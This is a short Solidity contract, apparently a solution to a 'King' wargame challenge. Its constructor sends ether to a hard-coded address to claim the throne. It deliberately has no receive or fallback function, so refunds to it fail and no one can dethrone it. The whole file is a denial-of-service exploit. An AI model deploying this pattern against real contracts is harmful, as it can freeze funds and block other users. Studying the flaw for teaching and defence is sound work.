// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract KingHunter {

    address kingSC = 0xFA10a86Ca9ECB247F03e3C1D0D0441B5522d68EB;

    constructor() payable {
       (bool success, ) = payable(kingSC).call{value: msg.value}("");
       require(success);
    }
}